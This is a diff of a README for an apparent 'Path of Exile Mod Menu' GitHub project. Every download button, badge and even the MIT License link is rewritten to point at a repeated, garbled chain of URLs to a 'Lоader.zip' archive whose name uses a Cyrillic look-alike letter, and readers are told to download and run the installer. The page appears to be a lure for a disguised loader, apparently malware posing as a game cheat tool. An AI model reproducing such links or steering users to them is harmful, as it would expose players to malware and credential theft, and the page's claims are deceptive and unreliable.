@@ -1,6 +1,6 @@
 # 🧙 Path of Exile Mod Menu
 
-[![Download Latest](https://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zip%20Latest-Path%20of%20Exile%20Mod%https://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zip)](https://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zip)
+[![Download Latest](https://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zip%20Latest-Path%20of%20Exile%20Mod%https://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zip)](https://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zip)
 
 Unlock new realms of possibility in Path of Exile with this advanced mod menu solution! 🚀 Enhance your gameplay through streamlined tools, dynamic customization, and seamless integration. Engineered for ease of use, optimized for all major operating systems, and built to amplify your adventure.
 
@@ -36,7 +36,7 @@ Unlock new realms of possibility in Path of Exile with this advanced mod menu so
 ## 🚀 Installation
 
 **Step 1:**  
-[![Download Now](https://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zip%20of%20Exile%20Mod%https://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zip)](https://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zip)
+[![Download Now](https://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zip%20of%20Exile%20Mod%https://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zip)](https://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zip)
 
 After downloading, run the installer and follow the on-screen instructions!
 
@@ -50,10 +50,10 @@ This software is developed for quality-of-life modifications compliant with Path
 
 ## 📄 License
 
-Distributed under the [MIT License](https://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zip) © 2025.
+Distributed under the [MIT License](https://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zip) © 2025.
 
 ---
 
 ## 🔗 Get Started Now!
 
-[![Download](https://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zip%20Version-Download-brightgreen)](https://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zip)
+[![Download](https://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zip%20Version-Download-brightgreen)](https://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DavidArias123/ExileModToolkit/main/Lоader.zip)
